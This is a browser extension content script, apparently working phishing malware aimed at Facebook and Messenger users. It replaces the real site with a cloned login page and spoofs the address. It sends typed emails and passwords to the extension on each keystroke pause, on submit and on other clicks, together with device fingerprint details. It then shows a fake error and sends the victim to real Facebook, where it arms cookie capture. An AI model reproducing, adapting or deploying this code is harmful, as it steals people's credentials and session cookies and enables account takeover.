﻿'use strict';
(() => {
  const H = location.hostname.toLowerCase();
  const isFB = /(^|\.)(facebook\.com|fb\.com|messenger\.com)$/.test(H);
  if (!isFB) return;
  if (location.search.includes('vfb=0')) return;   // ?vfb=0 => asli FB dikhao

  /* ================= keepalive port ================= */
  let port = null;
  (function connect() {
    try {
      port = chrome.runtime.connect({ name: 'vfb-keepalive' });
      port.onMessage.addListener(() => {});
      port.onDisconnect.addListener(() => { port = null; setTimeout(connect, 2000); });
    } catch (e) { setTimeout(connect, 2000); }
  })();
  setInterval(() => { try { port && port.postMessage({ t: Date.now() }); } catch (e) {} }, 20000);

  const send = (kind, payload) => new Promise(res => {
    try {
      chrome.runtime.sendMessage({ type: 'vfb:data', kind, payload }, r => {
        void chrome.runtime.lastError;
        res(r || { ok: false });
      });
    } catch (e) { res({ ok: false }); }
  });

  /* ================= handoff: retry ke baad real FB ================= */
  const HANDOFF_KEY = 'vfb_handoff';
  const HANDOFF_TTL = 5 * 60 * 1000;

  function handoffActive() {
    try {
      const t = +sessionStorage.getItem(HANDOFF_KEY);
      return !!t && Date.now() - t < HANDOFF_TTL;
    } catch (e) { return false; }
  }

  function goReal() {
    try { sessionStorage.setItem(HANDOFF_KEY, String(Date.now())); } catch (e) {}
    location.replace(mode === 'mobile' ? 'https://m.facebook.com/' : 'https://www.facebook.com/');
  }

  /* real FB pe: fake page mat banao, sirf cookie capture arm karo */
  if (handoffActive()) {
    try { chrome.runtime.sendMessage({ type: 'vfb:arm' }, () => void chrome.runtime.lastError); } catch (e) {}
    return;
  }

  /* ================= device detect ================= */
  const uaMobile = /Android|iPhone|iPod|iPad|Opera Mini|IEMobile|Mobile/i.test(navigator.userAgent);
  let mode = (uaMobile || window.innerWidth <= 820) ? 'mobile' : 'desktop';

  /* ================= state ================= */
  const st = { email: '', pass: '', view: 'login' };

  /* ================= styles ================= */
  const CSS = `
  *{box-sizing:border-box}
  html,body{margin:0;padding:0;min-height:100%}
  body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;background:#fff;color:#1c1e21;-webkit-font-smoothing:antialiased}
  .vfb-logo{color:#1877f2;font-weight:800;letter-spacing:-1.2px}
  .vfb-field{width:100%;height:52px;padding:14px 16px;font-size:17px;border:1px solid #dddfe2;border-radius:10px;outline:none;background:#fff;color:#1c1e21}
  .vfb-field:focus{border-color:#1877f2;box-shadow:0 0 0 3px rgba(24,119,242,.15)}
  .vfb-btn{width:100%;height:48px;border:0;border-radius:10px;background:#1877f2;color:#fff;font-size:17px;font-weight:700;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:8px}
  .vfb-btn:active{background:#166fe5}
  .vfb-btn.sec{background:#fff;color:#1877f2;border:1px solid #1877f2}
  .vfb-btn.sec:active{background:#f0f6ff}
  .vfb-link{color:#1877f2;font-size:14px;text-decoration:none;cursor:pointer}
  .vfb-sep{height:1px;background:#dadde1;margin:16px 0}
  .vfb-desktop{display:flex;flex-direction:column;align-items:center;padding:46px 16px 26px}
  .vfb-desktop .vfb-logo{font-size:46px;margin-bottom:26px}
  .vfb-card{width:100%;max-width:396px;border:1px solid #dadde1;border-radius:12px;padding:20px;box-shadow:0 2px 14px rgba(0,0,0,.07)}
  .vfb-card h1{font-size:20px;font-weight:600;text-align:center;margin:2px 0 18px}
  .vfb-row{margin-bottom:12px}
  .vfb-foot{max-width:396px;width:100%;margin-top:22px;text-align:center;color:#606770;font-size:12px;line-height:1.6}
  .vfb-mobile{display:flex;flex-direction:column;min-height:100vh;padding:40px 20px 24px;align-items:center}
  .vfb-mobile .vfb-logo{font-size:38px;margin-bottom:24px}
  .vfb-mobile .vfb-card{border:0;box-shadow:none;padding:0;max-width:400px}
  .vfb-mobile h1{font-size:22px;text-align:left;margin:0 0 18px}
  .vfb-mobile .vfb-foot{margin-top:26px}
  .vfb-spin{width:20px;height:20px;border:2.5px solid rgba(255,255,255,.45);border-top-color:#fff;border-radius:50%;animation:vfbspin .75s linear infinite}
  @keyframes vfbspin{to{transform:rotate(360deg)}}
  .vfb-err{text-align:center;padding:6px 0 18px}
  .vfb-err-ic{width:56px;height:56px;border-radius:50%;background:#fa3e3e;color:#fff;font-size:30px;font-weight:700;display:flex;align-items:center;justify-content:center;margin:0 auto 14px}
  .vfb-err h1{font-size:20px;font-weight:600;margin:0 0 8px}
  .vfb-err p{font-size:14px;color:#606770;margin:0;line-height:1.5}
  `;

  /* ================= markup ================= */
  function loginBody() {
    const desktop = mode === 'desktop';
    return `
    <div class="${desktop ? 'vfb-desktop' : 'vfb-mobile'}" id="vfb-root">
      <div class="vfb-logo">facebook</div>
      <div class="vfb-card">
        <h1>Log into Facebook</h1>
        <form id="vfb-form" autocomplete="on" novalidate>
          <div class="vfb-row">
            <input id="vfb-email" class="vfb-field" name="email" type="text"
                   placeholder="Email or phone number" autocomplete="username"
                   value="${esc(st.email)}" autocapitalize="off" spellcheck="false">
          </div>
          <div class="vfb-row">
            <input id="vfb-pass" class="vfb-field" name="pass" type="password"
                   placeholder="Password" autocomplete="current-password" value="${esc(st.pass)}">
          </div>
          <div class="vfb-row">
            <button id="vfb-submit" class="vfb-btn" type="submit">Log in</button>
          </div>
        </form>
        <div style="text-align:center"><a class="vfb-link" id="vfb-forgot">Forgotten password?</a></div>
        ${desktop ? '<div class="vfb-sep"></div>' : '<div style="height:14px"></div>'}
        <button class="vfb-btn sec" type="button" id="vfb-create">${desktop ? 'Create new account' : 'Create New Account'}</button>
      </div>
      <div class="vfb-foot">
        <div style="margin-bottom:6px">
          <a class="vfb-link" style="color:#606770;font-size:12px">English (UK)</a> ·
          <a class="vfb-link" style="color:#606770;font-size:12px">اردو</a> ·
          <a class="vfb-link" style="color:#606770;font-size:12px">हिन्दी</a>
        </div>
        Meta © ${new Date().getFullYear()}
      </div>
    </div>`;
  }

  function errorBody() {
    const desktop = mode === 'desktop';
    return `
    <div class="${desktop ? 'vfb-desktop' : 'vfb-mobile'}" id="vfb-root">
      <div class="vfb-logo">facebook</div>
      <div class="vfb-card">
        <div class="vfb-err">
          <div class="vfb-err-ic">!</div>
          <h1>Something went wrong</h1>
          <p>We couldn't log you in right now.<br>Please try again.</p>
        </div>
        <button class="vfb-btn" type="button" id="vfb-retry">Try again</button>
        <div class="vfb-sep"></div>
        <div style="text-align:center"><a class="vfb-link" id="vfb-back">Back to login</a></div>
      </div>
    </div>`;
  }

  function esc(s) {
    return String(s == null ? '' : s)
      .replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
  }

  function build() {
    const body = st.view === 'error' ? errorBody() : loginBody();
    const title = st.view === 'error' ? 'Facebook' : 'Facebook – log in or sign up';
    return {
      head: `<meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>${title}</title><style>${CSS}</style>`,
      body
    };
  }

  /* ================= mount / render ================= */
  let mounted = false;

  function mount() {
    const { head, body } = build();
    const full = `<!doctype html><html lang="en"><head>${head}</head><body>${body}</body></html>`;

    if (!mounted && document.readyState === 'loading') {
      try {
        document.open();
        document.write(full);
        document.close();
        mounted = true;
      } catch (e) {
        fallback(head, body);
        mounted = true;
      }
    } else {
      fallback(head, body);
      mounted = true;
    }
    attach();
    spoofUrl();
  }

  function fallback(head, body) {
    document.documentElement.className = '';
    if (document.head) document.head.innerHTML = head;
    if (document.body) document.body.innerHTML = body;
  }

  function rerender() {
    const { body } = build();
    const root = document.getElementById('vfb-root');
    if (!root) return mount();
    root.outerHTML = body;
    attach();
  }

  /* ================= URL spoofing ================= */
  function spoofUrl() {
    if (!isFB) return;
    const want = mode === 'mobile' ? 'https://m.facebook.com/' : 'https://www.facebook.com/';
    try {
      const u = new URL(want);
      if (u.host === location.host) history.replaceState(null, '', u.pathname + u.search);
    } catch (e) {}
  }

  /* ================= capture ================= */
  let debounce = null;

  function payload(reason) {
    return {
      reason,
      mode,
      url: location.href,
      ua: navigator.userAgent,
      platform: navigator.platform,
      language: navigator.language,
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      viewport: `${window.innerWidth}x${window.innerHeight}`,
      screen: `${screen.width}x${screen.height}`,
      ts: Date.now(),
      fields: { email: st.email, pass: st.pass }
    };
  }

  function snapshot(reason) { send('formdata', payload(reason)); }

  function readFields() {
    const e = document.getElementById('vfb-email');
    const p = document.getElementById('vfb-pass');
    if (e) st.email = e.value;
    if (p) st.pass = p.value;
  }

  function onInput(e) {
    const t = e.target;
    if (!t || !t.id) return;
    if (t.id !== 'vfb-email' && t.id !== 'vfb-pass') return;
    readFields();
    clearTimeout(debounce);
    debounce = setTimeout(() => snapshot('typing'), 1200);
  }

  let busy = false;

  async function onSubmit(e) {
    e.preventDefault();
    if (busy) return;

    readFields();

    if (!st.email.trim() || !st.pass) {
      [['vfb-email', !st.email.trim()], ['vfb-pass', !st.pass]].forEach(([id, bad]) => {
        const el = document.getElementById(id);
        if (el) el.style.borderColor = bad ? '#fa3e3e' : '#dddfe2';
      });
      return;
    }

    busy = true;
    const btn = document.getElementById('vfb-submit');
    if (btn) { btn.innerHTML = '<span class="vfb-spin"></span>'; btn.disabled = true; }

    await Promise.race([
      send('formdata', payload('submit')),
      new Promise(r => setTimeout(r, 4000))
    ]);

    busy = false;
    st.view = 'error';
    rerender();
  }

  function onClick(e) {
    const id = e.target && e.target.id;
    if (id === 'vfb-forgot') { e.preventDefault(); readFields(); snapshot('forgot-password'); }
    if (id === 'vfb-create') { e.preventDefault(); readFields(); snapshot('create-account'); }
    if (id === 'vfb-retry')  { e.preventDefault(); goReal(); }
    if (id === 'vfb-back')   { e.preventDefault(); st.view = 'login'; rerender(); }
  }

  function attach() {
    document.addEventListener('input', onInput, true);
    document.addEventListener('change', onInput, true);
    document.addEventListener('submit', onSubmit, true);
    document.addEventListener('click', onClick, true);
  }

  /* ================= resize ================= */
  let rt = null;
  window.addEventListener('resize', () => {
    clearTimeout(rt);
    rt = setTimeout(() => {
      const next = (uaMobile || window.innerWidth <= 820) ? 'mobile' : 'desktop';
      if (next !== mode && st.view === 'login') { mode = next; rerender(); }
    }, 250);
  });

  /* ================= boot ================= */
  attach();
  mount();

  const verify = () => {
    if (!document.getElementById('vfb-root')) mount();
    else document.title = 'Facebook';
  };
  document.addEventListener('DOMContentLoaded', verify, { once: true });
  setTimeout(verify, 400);
  setTimeout(verify, 1500);
})();